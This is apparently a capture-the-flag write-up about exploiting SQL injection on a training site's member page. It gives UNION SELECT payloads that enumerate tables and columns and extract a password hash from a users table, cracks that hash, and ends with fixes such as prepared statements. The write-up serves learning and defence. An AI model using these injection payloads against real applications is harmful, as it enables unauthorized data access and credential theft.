# Reproduction:  

On the **member** page, we used SQL injection to explore the database and obtain the flag.  

1. Retrieving available tables:  
   ```sql
   1 UNION SELECT table_name, null FROM information_schema.tables;
   ```  

2. Exploring columns:  
   ```sql
   1 UNION SELECT column_name, null FROM information_schema.columns;
   ```  

3. Extracting data from the `users` table:  
   ```sql
   1 UNION SELECT 1, first_name FROM users;
   ```  
   **Intriguing result**:  
   - ID: 1 UNION SELECT 1, first_name FROM users  
   - First name: 1  
   - Surname: Flag  

4. Retrieving information for the user with `user_id = 5` (as it comes in 5th position from our previous search):  
   ```sql
   1 UNION SELECT Commentaire, countersign FROM users WHERE user_id = 5;
   ```  
   **Result**:  
   - Countersign: `5ff9d0165b4f92b14994e5c685cdce28`  

5. Decrypting and transforming:  
   - MD5 → Plain text: `FortyTwo`  
   - Lowercase: `fortytwo`  
   - SHA-256: `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`  

# Problem:  
The application is vulnerable to SQL injection, allowing reading of sensitive data and exploration of the entire database.  

# Solution:  
1. **Prepared statements**:  
   Use parameters to prevent direct execution of user inputs, for example in PHP:  
   ```php
   $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
   $stmt->bindParam(':id', $id, PDO::PARAM_INT);
   $stmt->execute();
   ```  

2. **Input validation**:  
   Always filter inputs to prevent the execution of SQL commands.  

3. **Limited privileges**:  
   The database user should not have access to sensitive data such as `information_schema`.  

With these corrections, we can block this type of attack.